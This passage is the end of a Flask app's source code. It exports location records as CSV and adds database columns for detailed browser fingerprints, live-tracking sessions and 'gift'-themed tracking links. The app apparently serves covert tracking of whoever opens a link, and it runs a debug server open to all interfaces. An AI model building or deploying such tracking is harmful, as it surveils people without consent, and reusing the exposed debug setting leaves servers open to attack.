    return Response(stream_with_context(generate()), mimetype='text/csv', headers={'Content-Disposition': f'attachment; filename=viutck_locations_{datetime.utcnow().strftime("%Y-%m-%d")}.csv'})

# Create all tables inside context
with app.app_context():
    db.create_all()
    
    # Proactively check and alter table to add columns for SQLite/PostgreSQL
    new_cols = [
        ('theme', 'VARCHAR(50) DEFAULT \'gift\''),
        ('custom_slug', 'VARCHAR(100)'),
        ('timezone', 'VARCHAR(100)'),
        ('timezone_offset', 'INTEGER'),
        ('cpu_cores', 'INTEGER'),
        ('device_memory', 'DOUBLE PRECISION' if 'postgresql' in app.config['SQLALCHEMY_DATABASE_URI'] else 'FLOAT'),
        ('touch_points', 'INTEGER'),
        ('battery_level', 'DOUBLE PRECISION' if 'postgresql' in app.config['SQLALCHEMY_DATABASE_URI'] else 'FLOAT'),
        ('battery_charging', 'BOOLEAN'),
        ('connection_type', 'VARCHAR(50)'),
        ('canvas_fingerprint', 'VARCHAR(100)'),
        ('webgl_vendor', 'VARCHAR(200)'),
        ('webgl_renderer', 'VARCHAR(200)'),
        ('fonts_detected', 'VARCHAR(500)'),
        ('audio_inputs', 'INTEGER'),
        ('video_inputs', 'INTEGER'),
        ('is_mobile', 'BOOLEAN'),
        ('is_tablet', 'BOOLEAN'),
        ('screen_color_depth', 'INTEGER'),
        ('viewport', 'VARCHAR(50)'),
        ('prefers_dark_mode', 'BOOLEAN'),
        ('cookies_enabled', 'BOOLEAN'),
        ('plugins_count', 'INTEGER'),
        # Live tracking columns
        ('session_id', 'VARCHAR(100)'),
        ('is_live_update', 'BOOLEAN DEFAULT FALSE'),
        ('update_number', 'INTEGER DEFAULT 1'),
        ('ip_source', 'VARCHAR(50)')
    ]
    
    for col_name, col_type in new_cols:
        try:
            db.session.execute(db.text(f"ALTER TABLE location_entries ADD COLUMN {col_name} {col_type}"))
            db.session.commit()
        except Exception:
            db.session.rollback()
            
    for col_name, col_type in [('theme', 'VARCHAR(50) DEFAULT \'gift\''), ('custom_slug', 'VARCHAR(100)')]:
        try:
            db.session.execute(db.text(f"ALTER TABLE tracking_links ADD COLUMN {col_name} {col_type}"))
            db.session.commit()
        except Exception:
            db.session.rollback()
            
    try:
        db.session.execute(db.text("CREATE UNIQUE INDEX idx_tracking_links_custom_slug ON tracking_links(custom_slug)"))
        db.session.commit()
    except Exception:
        db.session.rollback()

    # Start Render keep-awake daemon thread if deployed
    if os.environ.get('RENDER_EXTERNAL_URL'):
        pinger_thread = threading.Thread(target=keep_alive, daemon=True)
        pinger_thread.start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
